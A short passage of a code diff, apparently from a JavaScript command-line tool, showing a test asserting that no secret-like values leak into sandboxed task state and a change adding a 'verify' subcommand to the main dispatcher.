       check('no secret-like values appear in any sandboxed task state produced by these tests', () => {
@@ -1143,6 +1727,7 @@ function main() {
   if (cmd === 'status') return cmdStatus(argv.slice(1));
   if (cmd === 'self-test') return cmdSelfTest();
   if (cmd === 'task') return cmdTask(argv.slice(1));
+  if (cmd === 'verify') return cmdVerify(argv.slice(1));
   printUsage();
   process.exitCode = 1;
 }
